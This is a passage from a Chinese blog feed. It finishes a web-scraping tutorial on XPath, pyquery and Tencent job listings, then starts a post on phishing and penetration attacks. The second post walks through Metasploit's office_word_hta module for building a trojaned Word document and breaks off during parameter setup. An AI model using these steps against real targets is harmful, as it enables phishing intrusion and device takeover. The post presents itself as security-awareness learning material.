class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="symbol">'//www.baidu.com/img/bd_logo1.png</span>', <span class="symbol">'//www.baidu.com/img/gs.gif</span>']</span><br><span class="line"></span><br><span class="line">[<span class="symbol">'//www.baidu.com/img/bd_logo1.png</span>']</span><br><span class="line"></span><br><span class="line">[<span class="symbol">'新闻</span>', <span class="symbol">'hao123</span>', <span class="symbol">'地图</span>', <span class="symbol">'视频</span>', <span class="symbol">'贴吧</span>', <span class="symbol">'登录</span>', <span class="symbol">'更多产品</span>', <span class="symbol">'关于百度</span>', <span class="symbol">'About</span> Baidu', <span class="symbol">'使用百度前必读</span>', <span class="symbol">'意见反馈</span>']</span><br><span class="line"></span><br><span class="line">[<span class="symbol">'新闻</span>']</span><br></pre></td></tr></table></figure><ul><li><code>img_href_ls = bd_bj.xpath(&quot;//img/@src&quot;)</code>，该代码先选取了当前节点下的所有<code>img</code>节点，然后将所有<code>img</code>节点的<code>src</code>属性值选取出来，返回的是一个列表形式</li><li><code>img_href = bd_bj.xpath(&quot;//div[@id=&#39;lg&#39;]/img[@hidefocus=&#39;true&#39;]/@src&quot;)</code>，该代码首先选取了当前节点下所有<code>id</code>属性值为<code>lg</code>的<code>div</code>，然后继续选取<code>div</code>节点下的直接子<code>img</code>节点（<code>hidefoucus=true</code>），最后选取其中的<code>src</code>属性值</li><li><code>a_content_ls = bd_bj.xpath(&quot;//a//text()&quot;)</code>，选取当前节点所有的<code>a</code>节点的所遇文本内容</li><li><code>a_news_content = bd_bj.xpath(&quot;//a[@class=&#39;mnav&#39; and @name=&#39;tj_trnews&#39;]/text()&quot;)</code>，多属性选择，在xpath中可以指定满足多个属性的节点，只需要<code>and</code>即可</li></ul><font color="red">提醒：读者在阅读的过程中注意将代码和输出的结果仔细对应起来，只要理解其中的意思也就不难记忆了。</font><h3 id="XPath小结"><a href="#XPath小结" class="headerlink" title="XPath小结"></a>XPath小结</h3><p>耐心看完了XPath的使用方法之后，聪明的读者应该不难发现，其实Beautiful Soup和XPath的本质和思路上基本相同，只要我们在阅读XPath用法的同时在脑袋中不断的思考，相信聪明的你阅读至此已经能够基本掌握了XPath用法。</p><h2 id="pyquery"><a href="#pyquery" class="headerlink" title="pyquery"></a>pyquery</h2><p>对于pyquery，官方的解释如下：</p><blockquote><p>pyquery allows you to make jquery queries on xml documents. The API is as much as possible the similar to jquery. pyquery uses lxml for fast xml and html manipulation.<br>This is not (or at least not yet) a library to produce or interact with javascript code. I just liked the jquery API and I missed it in python so I told myself “Hey let’s make jquery in python”. This is the result.<br>It can be used for many purposes, one idea that I might try in the future is to use it for templating with pure http templates that you modify using pyquery. I can also be used for web scrapping or for theming applications with Deliverance.<br>The project is being actively developped on a git repository on Github. I have the policy of giving push access to anyone who wants it and then to review what he does. So if you want to contribute just email me.<br>Please report bugs on the github issue tracker.</p></blockquote><p>在网页解析过程中，除了强大的Beautiful Soup和XPath之外，还有qyquery的存在，qyquery同样受到了不少“蜘蛛”的欢迎，下面我们来介绍下qyquery的使用。</p><h3 id="节点选择-2"><a href="#节点选择-2" class="headerlink" title="节点选择"></a>节点选择</h3><p>与Beautiful Soup和XPath明显不同的是，在qyquery中，一般存在着三种解析方式，一种是<code>requests</code>请求链接之后把html进行传递，一种是将<code>url</code>直接进行传递，还有一种是直接传递本地<code>html</code>文件路径即可，读者在实际使用的过程中根据自己的习惯来编码即可，下面我们来看下这三种方式的表达：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pyquery import PyQuery as pq</span><br><span class="line"></span><br><span class="line">bd_html = requests.get(<span class="string">"https://www.baidu.com"</span>).text</span><br><span class="line">bd_url = <span class="string">"https://www.baidu.com"</span></span><br><span class="line">bd_path = <span class="string">"./bd.html"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用html参数进行传递</span></span><br><span class="line">def way1(html):</span><br><span class="line">    <span class="keyword">return</span> p<span class="string">q(html)</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 使用url参数进行传递</span></span><br><span class="line">def way2(url):</span><br><span class="line">    <span class="keyword">return</span> p<span class="string">q(url=url)</span></span><br><span class="line"></span><br><span class="line">def way3(path):</span><br><span class="line">    <span class="keyword">return</span> p<span class="string">q(filename=path)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(type(way1(html=bd_html)))</span><br><span class="line"><span class="keyword">print</span>(type(way2(url=bd_url)))</span><br><span class="line"><span class="keyword">print</span>(type(way3(path=bd_path)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;class 'pyquery.pyquery.PyQuery'&gt;</span></span><br><span class="line"><span class="comment"># &lt;class 'pyquery.pyquery.PyQuery'&gt;</span></span><br><span class="line"><span class="comment"># &lt;class 'pyquery.pyquery.PyQuery'&gt;</span></span><br></pre></td></tr></table></figure><p>从上面三种获得解析对象方法的代码中我们可以明显看见都可以得到一样的解析对象，接下来我们只要利用这个对象来对页面进行解析从而提取出我们想要得到的有效信息即可，在qyquery中一般使用的是CSS选择器来选取。下面我们仍然使用百度首页来讲解pyquery的使用，在这里我们假设解析对象为<code>bd_bj</code>。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(<span class="string">"https://www.baidu.com"</span>)</span><br><span class="line">response.encoding = <span class="string">"utf-8"</span></span><br><span class="line"></span><br><span class="line">bd_bj = pq(response.text)</span><br><span class="line"></span><br><span class="line">bd_title = bd_bj(<span class="string">"title"</span>)</span><br><span class="line">bd_img_ls = bd_bj(<span class="string">"img"</span>)</span><br><span class="line">bd_img_ls2 = bd_bj.find(<span class="string">"img"</span>)</span><br><span class="line">bd_mnav = bd_bj(<span class="string">".mnav"</span>)</span><br><span class="line">bd_img = bd_bj(<span class="string">"#u1 a"</span>)</span><br><span class="line">bd_a_video = bd_bj(<span class="string">"#u1 .mnav"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;title&gt;百度一下，你就知道&lt;/title&gt;</span></span><br><span class="line"><span class="comment"># &lt;img hidefocus="true" src="//www.baidu.com/img/bd_logo1.png" width="270" height="129"/&gt; &lt;img src="//www.baidu.com/img/gs.gif"/&gt; </span></span><br><span class="line"><span class="comment"># ......</span></span><br><span class="line"><span class="comment"># 输出结果较长，读者可自行运行</span></span><br></pre></td></tr></table></figure><p>正如上面代码所示，pyquery在进行节点提取的时候通常有三种方式，一种是直接提取出节点名即可提取出整个节点，当然这种方式你也可以使用<code>find</code>方法，这种提取节点的方式是不加任何属性限定的，所以提取出的节点往往会含有多个，所以我们可以使用循环<code>.items()</code>来进行操作；一种是提取出含有特定<code>class</code>属性的节点，这种形式采用的是<code>.+class属性值</code>；还有一种是提取含有特定<code>id</code>属性的节点，这种形式采用的是<code>#+id属性值</code>。熟悉<code>CSS</code>的读者应该不难理解以上提取节点的方法，正是在<code>CSS</code>中提取节点然后对其进行样式操作的方法。上述三种方式您也可以像提取<code>bd_a_video</code>一样混合使用</p><h3 id="数据提取-2"><a href="#数据提取-2" class="headerlink" title="数据提取"></a>数据提取</h3><p>在实际解析网页的过程中，三种解析方式基本上大同小异，为了读者认识<code>pyquery</code>的数据提取的操作以及博主日后的查阅，在这里简单的介绍下</p><figure class="highlight golo"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">img_src1 = bd_bj(<span class="string">"img"</span>).attr(<span class="string">"src"</span>) <span class="comment"># //www.baidu.com/img/bd_logo1.png</span></span><br><span class="line">img_src2 = bd_bj(<span class="string">"img"</span>).attr.src    <span class="comment"># //www.baidu.com/img/bd_logo1.png</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="keyword">each</span> <span class="keyword">in</span> bd_bj.<span class="keyword">find</span>(<span class="string">"img"</span>).items():</span><br><span class="line">    <span class="keyword">print</span>(<span class="keyword">each</span>.attr(<span class="string">"src"</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">print</span>(bd_bj(<span class="string">"title"</span>).text())    <span class="comment"># 百度一下，你就知道</span></span><br></pre></td></tr></table></figure><p>如上一二行代码所示，提取节点属性我们可以有两种方式，这里拿<code>src</code>属性来进行说明，一种是<code>.attr(&quot;src&quot;)</code>，另外一种是<code>.attr.src</code>，读者根据自己的习惯来操作即可，这里需要注意的是：在节点提取小结中我们说了在不限制属性的情况下是提取出所有满足条件的节点，所以在这种情况下提取出的属性是第一个节点属性。要想提取所有的节点的属性，我们可以如四五行代码那样使用<code>.items()</code>然后进行遍历，最后和之前一样提取各个节点属性即可。<code>qyquery</code>提取节点中文本内容如第七行代码那样直接使用<code>.text()</code>即可。</p><h3 id="pyquery小结"><a href="#pyquery小结" class="headerlink" title="pyquery小结"></a>pyquery小结</h3><p>pyquery解析如Beautiful Soup和XPath思想一致，所以这了只是简单的介绍了下，想要进一步了解的读者可查阅官方文档在加之熟练操作即可。</p><h2 id="腾讯招聘网解析实战"><a href="#腾讯招聘网解析实战" class="headerlink" title="腾讯招聘网解析实战"></a>腾讯招聘网解析实战</h2><p>通过上述对Beautiful Soup、XPath以及pyquery的介绍，认真阅读过的读者想必已经有了一定的基础，下面我们通过一个简单的实战案例来强化一下三种解析方式的操作。此次解析的网站为腾讯招聘网，网址url：<a href="https://hr.tencent.com/" target="_blank" rel="noopener">https://hr.tencent.com/</a>，其社会招聘网首页如下所示：<br><img src="https://gss0.baidu.com/-vo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/aa64034f78f0f7369adfccd70755b319eac413c6.jpg" width="500"></p><p>此次我们的任务就是分别利用上述三种解析工具来接下该网站下的社会招聘中的所有数据。</p><h3 id="网页分析："><a href="#网页分析：" class="headerlink" title="网页分析："></a>网页分析：</h3><p>通过该网站的社会招聘的首页，我们可以发现如下三条主要信息：</p><ul><li>首页url连接为<a href="https://hr.tencent.com/position.php" target="_blank" rel="noopener">https://hr.tencent.com/position.php</a></li><li>一共有288页的数据，每页10个职位，总职位共计2871</li><li>数据字段有五个，分别为：职位名称、职位类别、招聘人数、工作地点、职位发布时间</li></ul><p>既然我们解析的是该网站下所有职位数据，再者我们停留在第一页也没有发现其他有价值的信息，不如进入第二页看看，这时我们可以发现网站的url链接有了一个比较明显的变化，即原链接在用户端提交了一个<code>start</code>参数，此时链接为<a href="https://hr.tencent.com/position.php?&amp;start=10#a" target="_blank" rel="noopener">https://hr.tencent.com/position.php?&amp;start=10#a</a>，陆续打开后面的页面我们不难发现其规律：每一页提交的<code>start</code>参数以10位公差进行逐步递增。之后，我们使用谷歌开发者工具来审查该网页，我们可以发现全站皆为静态页面，这位我们解析省下了不少麻烦，我们需要的数据就静态的放置在<code>table</code>标签内，如下所示：<br><img src="https://gss0.baidu.com/94o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/e850352ac65c1038f3b24f14bf119313b17e891c.jpg" width="500"></p><p>下面我们具体来分别使用以上三种工具来解析该站所有职位数据。</p><h3 id="案例源码"><a href="#案例源码" class="headerlink" title="案例源码"></a>案例源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TencentPosition</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">功能： 定义初始变量</span></span><br><span class="line"><span class="string">参数：</span></span><br><span class="line"><span class="string">start： 起始数据</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, start)</span>:</span></span><br><span class="line">self.url = <span class="string">"https://hr.tencent.com/position.php?&amp;start=&#123;&#125;#a"</span>.format(start)</span><br><span class="line">self.headers = &#123;</span><br><span class="line"><span class="string">"Host"</span>: <span class="string">"hr.tencent.com"</span>,</span><br><span class="line"><span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"</span>,</span><br><span class="line">&#125;</span><br><span class="line">self.file_path = <span class="string">"./TencentPosition.csv"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">功能： 请求目标页面</span></span><br><span class="line"><span class="string">参数：</span></span><br><span class="line"><span class="string">url： 目标链接</span></span><br><span class="line"><span class="string">headers： 请求头</span></span><br><span class="line"><span class="string">返回：</span></span><br><span class="line"><span class="string">html，页面源码</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page</span><span class="params">(self, url, headers)</span>:</span> </span><br><span class="line">res = requests.get(url, headers=headers)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line"><span class="keyword">return</span> res.text</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> self.get_page(url, headers=headers)</span><br><span class="line"><span class="keyword">except</span> RequestException <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">return</span> self.get_page(url, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">功能： Beautiful Soup解析页面</span></span><br><span class="line"><span class="string">参数：</span></span><br><span class="line"><span class="string">html： 请求页面源码</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">soup_analysis</span><span class="params">(self, html)</span>:</span></span><br><span class="line">soup = BeautifulSoup(html, <span class="string">"lxml"</span>)</span><br><span class="line">tr_list = soup.find(<span class="string">"table"</span>, class_=<span class="string">"tablelist"</span>).find_all(<span class="string">"tr"</span>)</span><br><span class="line"><span class="keyword">for</span> tr <span class="keyword">in</span> tr_list[<span class="number">1</span>:<span class="number">-1</span>]:</span><br><span class="line">position_info = [td_data <span class="keyword">for</span> td_data <span class="keyword">in</span> tr.stripped_strings]</span><br><span class="line">self.settle_data(position_info=position_info)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">功能： xpath解析页面</span></span><br><span class="line"><span class="string">参数：</span></span><br><span class="line"><span class="string">html： 请求页面源码</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xpath_analysis</span><span class="params">(self, html)</span>:</span></span><br><span class="line">result = etree.HTML(html)</span><br><span class="line">tr_list = result.xpath(<span class="string">"//table[@class='tablelist']//tr"</span>)</span><br><span class="line"><span class="keyword">for</span> tr <span class="keyword">in</span> tr_list[<span class="number">1</span>:<span class="number">-1</span>]:</span><br><span class="line">position_info = tr.xpath(<span class="string">"./td//text()"</span>)</span><br><span class="line">self.settle_data(position_info=position_info)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">功能： pyquery解析页面</span></span><br><span class="line"><span class="string">参数：</span></span><br><span class="line"><span class="string">html： 请求页面源码</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pyquery_analysis</span><span class="params">(self, html)</span>:</span></span><br><span class="line">result = pq(html)</span><br><span class="line">tr_list = result.find(<span class="string">".tablelist"</span>).find(<span class="string">"tr"</span>)</span><br><span class="line"><span class="keyword">for</span> tr <span class="keyword">in</span> itertools.islice(tr_list.items(), <span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">position_info = [td.text() <span class="keyword">for</span> td <span class="keyword">in</span> tr.find(<span class="string">"td"</span>).items()]</span><br><span class="line">self.settle_data(position_info=position_info)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">功能： 职位数据整合</span></span><br><span class="line"><span class="string">参数：</span></span><br><span class="line"><span class="string">position_info： 字段数据列表</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">settle_data</span><span class="params">(self, position_info)</span>:</span></span><br><span class="line">position_data = &#123;</span><br><span class="line"><span class="string">"职位名称"</span>: position_info[<span class="number">0</span>].replace(<span class="string">"\xa0"</span>, <span class="string">" "</span>),<span class="comment"># replace替换\xa0字符防止转码error</span></span><br><span class="line"><span class="string">"职位类别"</span>: position_info[<span class="number">1</span>],</span><br><span class="line"><span class="string">"招聘人数"</span>: position_info[<span class="number">2</span>],</span><br><span class="line"><span class="string">"工作地点"</span>: position_info[<span class="number">3</span>],</span><br><span class="line"><span class="string">"发布时间"</span>: position_info[<span class="number">-1</span>],</span><br><span class="line">&#125;</span><br><span class="line">print(position_data)</span><br><span class="line">self.save_data(self.file_path, position_data)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">功能： 数据保存</span></span><br><span class="line"><span class="string">参数：</span></span><br><span class="line"><span class="string">file_path： 文件保存路径</span></span><br><span class="line"><span class="string">position_data： 职位数据</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_data</span><span class="params">(self, file_path, position_data)</span>:</span></span><br><span class="line">df = pd.DataFrame([position_data])</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">df.to_csv(file_path, header=<span class="keyword">False</span>, index=<span class="keyword">False</span>, mode=<span class="string">"a+"</span>, encoding=<span class="string">"gbk"</span>)<span class="comment"># 数据转码并换行存储</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"><span class="keyword">for</span> page, index <span class="keyword">in</span> enumerate(range(<span class="number">287</span>)):</span><br><span class="line">print(<span class="string">"正在爬取第&#123;&#125;页的职位数据:"</span>.format(page+<span class="number">1</span>))</span><br><span class="line">tp = TencentPosition(start=(index*<span class="number">10</span>))</span><br><span class="line">tp_html = tp.get_page(url=tp.url, headers=tp.headers)</span><br><span class="line">tp.pyquery_analysis(html=tp_html)</span><br><span class="line">print(<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure><p>部分结果如下：<br><img src="https://gss0.baidu.com/94o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/d4628535e5dde7115832c220aaefce1b9c166100.jpg" width="500"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在本篇文章中，首先我们分别介绍了Beautiful Soup、XPath、pyquery的常见操作，之后通过使用该三种解析工具来爬取腾讯招聘网中所有的职位招聘数据，从而进一步让读者有一个更加深刻的认识。该案例中，由于本篇文章重点在于网站页面的解析方法，所以未使用多线程、多进程，爬取所有的数据爬取的时间在两分钟左右，在之后的文章中有时间的话会再次介绍多线程多进程的使用，案例中的解析方式都已介绍过，所以读者阅读源码即可。</p><font color="red">注意：本文章中所有的内容皆为在实际开发中常见的一些操作，并非所有，想要进一步提升等级的读者务必请阅读官方文档。</font><div style="text-align: right">2019-01-01,By Zero</div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;With the rapid development of the Internet，越来越多的信息充斥着各大网络平台。正如&lt;a href=
      
    
    </summary>
    
      <category term="爬虫" scheme="muzimz.cn/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="Beautiful Soup" scheme="muzimz.cn/tags/Beautiful-Soup/"/>
    
      <category term="XPath" scheme="muzimz.cn/tags/XPath/"/>
    
      <category term="pyquery" scheme="muzimz.cn/tags/pyquery/"/>
    
  </entry>
  
  <entry>
    <title>渗透攻击</title>
    <link href="muzimz.cn/2018/12/14/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB/"/>
    <id>muzimz.cn/2018/12/14/渗透攻击/</id>
    <published>2018-12-14T12:58:35.000Z</published>
    <updated>2019-02-02T16:36:09.029Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>已经有两个多月没有记录了，最近一直在忙于复习408、线代，还有kaggle的学习，原本打算暂时不再更新文章的，但是最近收到不少了类似像教务处通知、竞赛确认、务必查收等社工邮件亦或短信，是在是可恶至极，所以就再来水一篇文章吧。之后Zero搜索下相关新闻咨询，发现类似诈骗案件的报道还真不少，一大叠一大叠的层出不穷，令人遗憾的是有不少用户抵抗不了自己的好奇心从而咬住了攻击者的“鱼钩”，故而给对方有了可乘之机。<br><img src="http://pjq6e477y.bkt.clouddn.com/1.png" width="600"></p><p>Zero最近同样收到了不少这种邮件，比如昨天下午收到的这封：<br><img src="http://pjq6e477y.bkt.clouddn.com/2.png" width="600"></p><p>虽然类似这种现象很是常见，但是万变不离其宗，攻击者主要是利用社会工程学 + 人们对事物的好奇心理来实行攻击。你的兴趣爱好、个人情感甚至是你的某一篇朋友圈等信息对于他们来说就富含了极大的价值，他们往往能够从中洞察一些别样的信息，也许这些不起眼的信息正是他成功攻击的关键。</p><p>所以说，在日常生活中，加强我们的网络安全意识是有必要的，不要天真的以为这些离你还很远，等到来临的那一刻恐怕就为时已晚了。在之前的文章中，已经介绍了无线wifi的入侵，可见：<a href="https://jacklxj.github.io/2018/12/14/WIFI%E7%A0%B4%E8%A7%A3/" target="_blank" rel="noopener">Wifi破解</a><br>本文主要介绍以下一些常见的攻击手段，希望能对读者有所帮助：</p><ul><li>社工邮件</li><li>钓鱼网站</li><li>安卓渗透</li><li>短信诈骗</li></ul><h2 id="免责申明"><a href="#免责申明" class="headerlink" title="免责申明"></a>免责申明</h2><font color="red">任何具有一定侵略性的网络攻击行为都属于非法操作。本文中所有的内容是在自家寝室进行，所攻击的wifi也是自家寝室内的，该文仅供学习，切勿用于非法操作，一切后果由使用者本人负责。（会坐牢的）</font><p><img src="http://ww2.sinaimg.cn/bmiddle/6af89bc8gw1f8nuikkysoj20k00k0abx.jpg"></p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>关于Kali Linux的下载安装，之前的文章已经有所介绍，这里就不再重述了。</p><ol><li>攻击机：Kali Linux</li><li>靶机：Windows 7，android</li><li>工具：Metasploit、setoolkit</li></ol><h2 id="社工邮件"><a href="#社工邮件" class="headerlink" title="社工邮件"></a>社工邮件</h2><p>在带有诈骗性的邮件中往往包含了钓鱼链接、木马文件之类的信息，主题中常常带有一些异奇描述，而这些描述则会带你落入圈套，博主不是很会描述，总之核心就是社会工程学。为了让大家理解其中的含义，下面拿诸葛建伟老师的<a href="https://baike.baidu.com/item/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5/12350978?fr=aladdin" target="_blank" rel="noopener">《Metasploit渗透测试魔鬼训练营》</a>一书中的一个例子来说明下：<br><img src="http://pjq6e477y.bkt.clouddn.com/3.png" width="600"></p><p>看到没有，类似上图中的邮件内容，就是酱紫的。下面我们具体来介绍下实现的过程，这次使用的是<code>exploit/windows/fileformat/office_word_hta</code>模块来生成一个带有木马的<code>word</code>文件，目标打开该文件之后，将会在Kali终端获得目标的session，进而控制对方的设备并获取有价值得信息。</p><h3 id="木马文件的生成"><a href="#木马文件的生成" class="headerlink" title="木马文件的生成"></a>木马文件的生成</h3><ul><li>进入Metasploit终端<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">msfconsole</span></span><br></pre></td></tr></table></figure></li></ul><p>执行之后，我们将进入<code>Metasploit</code>终端，如下图所示：<br><img src="http://pjq6e477y.bkt.clouddn.com/7.PNG" width="600"></p><ul><li>引入<code>exploit/windows/fileformat/office_word_hta</code>模块</li></ul><p>进入到<code>Metasploit</code>之后，通过之前的分析，我们是要生成一个木马文件来对选择的目标进行攻击，所以我们需要查询该Kali Linux系统中是否集成了所用模块，在本次我们拿<code>.doc</code>word文件来进行演示，为此执行如下命令：<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">search office</span></span><br></pre></td></tr></table></figure></p><p>命令执行后显示如下：<br><img src="http://pjq6e477y.bkt.clouddn.com/8.PNG" width="600"></p><p>由上图我们可以发现，在对模块进行查找的过程中成功找到了三个模块，此次我们使用的是<code>exploit/windows/fileformat/office_word_hta</code>模块，执行以下命令来引入该命令：<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> exploit/windows/fileformat/office_word_hta</span><br></pre></td></tr></table></figure></p><ul><li>参数设置</li></ul><p>引入模块之后，我们还需要查询该模块所需要的参数从而发动监听，命令如下：<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">show options</span></span><br></pre></td></tr></table></figure></p><p><img src="http://pjq6e477y.bkt.clouddn.com/9.PNG" width="600"></p><p>通过上图，我们可以发现，所需要的参数主要有以下一些：<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">SRVHOST</span><span class="comment"># 攻击机的ip地址，即Kali Linux</span></span><br><span class="line">FIlENAME <span class="comment"># 自定义生成的文件名</span></span><br></pre></td></tr></table></figure></p><p>通过上述参数的讲解之后，我们对其进行一一设置，命令如下：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span 